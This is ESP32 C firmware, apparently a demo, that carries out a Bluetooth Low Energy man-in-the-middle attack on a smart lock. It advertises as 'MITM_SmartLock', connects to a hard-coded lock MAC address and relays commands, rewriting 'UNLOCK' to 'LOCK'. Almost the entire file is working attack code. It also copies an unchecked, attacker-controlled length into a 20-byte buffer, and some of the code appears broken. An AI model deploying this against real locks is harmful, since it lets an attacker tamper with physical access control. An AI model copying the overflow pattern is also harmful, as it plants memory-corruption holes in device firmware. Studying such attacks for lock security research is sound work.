#include <stdio.h>
#include <string.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_log.h"
#include "nvs_flash.h"
#include "driver/gpio.h"

#include "esp_bt.h"
#include "esp_gap_ble_api.h"
#include "esp_gatts_api.h"
#include "esp_gattc_api.h"
#include "esp_bt_main.h"
#include "esp_gatt_common_api.h"

#define TAG "MITM_DEMO"

// LED pins
#define LED_GPIO_1 GPIO_NUM_4
#define LED_GPIO_2 GPIO_NUM_5

// BLE UUIDs
#define SERVICE_UUID 0x1234
#define CHAR_UUID    0xABCD

// Real SmartLock MAC
static const uint8_t real_lock_mac[6] = {0x4C,0xC3,0x82,0x0C,0x40,0xC6};

// BLE client/server handles
static bool real_lock_connected = false;
static uint16_t remote_conn_id = 0;
static uint16_t remote_char_handle = 0;
static esp_gatt_if_t gatt_if_client;

// Advertising params
static esp_ble_adv_params_t adv_params = {
    .adv_int_min = 0x60,
    .adv_int_max = 0xA0,
    .adv_type = ADV_TYPE_IND,
    .own_addr_type = BLE_ADDR_TYPE_PUBLIC,
    .channel_map = ADV_CHNL_ALL,
    .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
};

// Forward command to real SmartLock
void forward_to_real_lock(const uint8_t *data, uint16_t len) {
    if (!real_lock_connected) {
        ESP_LOGW(TAG, "Real SmartLock not connected!");
        return;
    }
    esp_ble_gattc_write_char(
        gatt_if_client,
        remote_conn_id,
        remote_char_handle,
        len,
        (uint8_t*)data,
        ESP_GATT_WRITE_TYPE_RSP,
        ESP_GATT_AUTH_REQ_NONE
    );
    ESP_LOGI(TAG, "Forwarded to real SmartLock: %.*s", len, data);
}

// Handle incoming commands from BLE client
static void handle_command(const uint8_t *data, uint16_t len) {
    char cmd[20] = {0};
    memcpy(cmd, data, len);
    ESP_LOGI(TAG, "MITM received: %s", cmd);

    // Manipulate commands if desired
    if (strcmp(cmd, "UNLOCK") == 0) {
        ESP_LOGW(TAG, "MITM: UNLOCK changed to LOCK!");
        gpio_set_level(LED_GPIO_1, 1);
        gpio_set_level(LED_GPIO_2, 0);
        const char *fake = "LOCK";
        forward_to_real_lock((uint8_t*)fake, strlen(fake));
        return;
    }

    // Normal LOCK
    if (strcmp(cmd, "LOCK") == 0) {
        gpio_set_level(LED_GPIO_1, 1);
        gpio_set_level(LED_GPIO_2, 0);
    }

    // Forward to real lock
    forward_to_real_lock(data, len);
}

// GAP callback
static void gap_cb(esp_gap_ble_cb_event_t event, esp_ble_gap_cb_param_t *param) {
    if (event == ESP_GAP_BLE_ADV_START_COMPLETE_EVT) {
        if (param->adv_start_cmpl.status == ESP_BT_STATUS_SUCCESS)
            ESP_LOGI(TAG, "Advertising started successfully");
        else
            ESP_LOGE(TAG, "Failed to start advertising");
    }
}

// GATT server callback
static void gatts_event_handler(esp_gatts_cb_event_t event, esp_gatt_if_t gatts_if,
                                esp_ble_gatts_cb_param_t *param) {
    switch(event) {
        case ESP_GATTS_REG_EVT: {
            ESP_LOGI(TAG, "GATT Server Registered");
            esp_ble_gap_register_callback(gap_cb);
            esp_ble_gap_set_device_name("MITM_SmartLock");
            esp_ble_gap_start_advertising(&adv_params);

            esp_gatt_srvc_id_t service_id = {
                .is_primary = true,
                .id.inst_id = 0,
                .id.uuid.len = ESP_UUID_LEN_16,
                .id.uuid.uuid.uuid16 = SERVICE_UUID
            };
            esp_ble_gatts_create_service(gatts_if, &service_id, 4);
            break;
        }
        case ESP_GATTS_CREATE_EVT: {
            uint16_t service_handle = param->create.service_handle;
            esp_ble_gatts_start_service(service_handle);

            esp_bt_uuid_t char_uuid = { .len = ESP_UUID_LEN_16, .uuid.uuid16 = CHAR_UUID };
            esp_ble_gatts_add_char(service_handle,
                                   &char_uuid,
                                   ESP_GATT_PERM_WRITE,
                                   ESP_GATT_CHAR_PROP_BIT_WRITE,
                                   NULL,
                                   NULL);
            break;
        }
        case ESP_GATTS_WRITE_EVT:
            ESP_LOGI(TAG, "Server WRITE_EVT, len=%d", param->write.len);
            handle_command(param->write.value, param->write.len);
            break;
        default:
            break;
    }
}

// GATT client callback
static void gattc_event_handler(esp_gattc_cb_event_t event, esp_gatt_if_t gattc_if,
                                esp_ble_gattc_cb_param_t *param) {
    switch(event) {
        case ESP_GATTC_REG_EVT:
            ESP_LOGI(TAG,"GATT Client Registered");
            // Connect to real SmartLock
            esp_ble_gattc_open(gattc_if, (uint8_t*)real_lock_mac, BLE_ADDR_TYPE_PUBLIC, true);
            break;
        case ESP_GATTC_OPEN_EVT:
            ESP_LOGI(TAG, "Connected to real SmartLock");
            real_lock_connected = true;
            remote_conn_id = param->open.conn_id;
            // Discover services/characteristics
            uint16_t count = 0;
            esp_gattc_char_elem_t char_elem;
            esp_ble_gattc_get_char_by_uuid(
                gattc_if,
                remote_conn_id,
                0x0001,  // start handle
                0xFFFF,  // end handle
                (esp_bt_uuid_t){.len=ESP_UUID_LEN_16, .uuid.uuid16=CHAR_UUID},
                &char_elem,
                &count
            );
            if (count > 0) {
                remote_char_handle = char_elem.char_handle;
                ESP_LOGI(TAG,"Found SmartLock characteristic handle: %d", remote_char_handle);
            }
            break;
        case ESP_GATTC_DISCONNECT_EVT:
            ESP_LOGW(TAG, "Disconnected from real SmartLock");
            real_lock_connected = false;
            break;
        default:
            break;
    }
}

// Main
void app_main(void) {
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES) {
        nvs_flash_erase();
        nvs_flash_init();
    }

    // LEDs
    gpio_reset_pin(LED_GPIO_1);
    gpio_set_direction(LED_GPIO_1, GPIO_MODE_OUTPUT);
    gpio_reset_pin(LED_GPIO_2);
    gpio_set_direction(LED_GPIO_2, GPIO_MODE_OUTPUT);

    gpio_set_level(LED_GPIO_1, 1);
    gpio_set_level(LED_GPIO_2, 1);
    vTaskDelay(2000 / portTICK_PERIOD_MS);
    gpio_set_level(LED_GPIO_1, 0);
    gpio_set_level(LED_GPIO_2, 0);

    // BLE init
    esp_bt_controller_mem_release(ESP_BT_MODE_CLASSIC_BT);
    esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
    esp_bt_controller_init(&bt_cfg);
    esp_bt_controller_enable(ESP_BT_MODE_BLE);
    esp_bluedroid_init();
    esp_bluedroid_enable();

    // Register server and client
    esp_ble_gatts_register_callback(gatts_event_handler);
    esp_ble_gatts_app_register(0);
    esp_ble_gattc_register_callback(gattc_event_handler);
    esp_ble_gattc_app_register(1);

    ESP_LOGI(TAG,"MITM ESP32 started");
}